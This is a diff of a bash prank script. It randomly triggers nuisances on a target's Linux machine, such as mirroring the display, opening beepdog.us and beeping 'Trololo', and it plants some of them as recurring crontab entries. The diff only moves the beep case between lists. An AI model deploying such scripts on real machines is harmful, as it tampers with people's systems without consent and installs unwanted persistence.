@@ -21,7 +21,7 @@ RANDOM=`date '+%s'`
 # Semi-permanent prank
 for n in {1 .. $[($RANDOM % 3) + 1]}
 do
-    case $[$RANDOM % 11] in
+    case $[$RANDOM % 10] in
         0) # Mirror the display weekly
             crontab -l | sed "\$a\@weekly /usr/bin/xrandr --output $DEVICE --reflect xy" | crontab -
             ;;
@@ -68,18 +68,13 @@ do
         9) # Open beepdog daily
             crontab -l | sed "\$a\@daily nohup www-browser http://beepdog.us >> /dev/null &" | crontab -
             ;;
-        10) # Play the first notes of "Trololo" on the users PC speaker
-            beep -f 261.6 -l 30 -D 70 -n -f 329.6 -l 30 -D 70 -n -f 392.0 -l 30 -D 70 -n -f 493.9 -l 30 -D 70 -n -f 
-440.0 -l 30 -D 170 -n -f 440.0 -l 30 -D 70 -n -f 349.2 -l 30 -D 70 -n -f 392.0 -l 30 -D 170 -n -f 392.0 -l 30 -D 70 -n 
--f 277.2 -l 30 -D 70 -n -f 329.0 -l 30
-            ;;
     esac
 done
 
 # Active distraction prank
 for n in {1 .. $[($RANDOM % 3) + 1]}
 do
-    case $[$RANDOM % 8] in
+    case $[$RANDOM % 9] in
         0) # Mirror the display
             xrandr --output $DEVICE --reflect xy
             ;;
@@ -106,6 +101,11 @@ do
             ;;
         7) # Beepdog!
             nohup www-browser http://beepdog.us >> /dev/null &
+            ;;
+        8) # Play the first notes of "Trololo" on the users PC speaker
+            beep -f 261.6 -l 30 -D 70 -n -f 329.6 -l 30 -D 70 -n -f 392.0 -l 30 -D 70 -n -f 493.9 -l 30 -D 70 -n -f 
+440.0 -l 30 -D 170 -n -f 440.0 -l 30 -D 70 -n -f 349.2 -l 30 -D 70 -n -f 392.0 -l 30 -D 170 -n -f 392.0 -l 30 -D 70 -n 
+-f 277.2 -l 30 -D 70 -n -f 329.0 -l 30
             ;;
     esac
 done
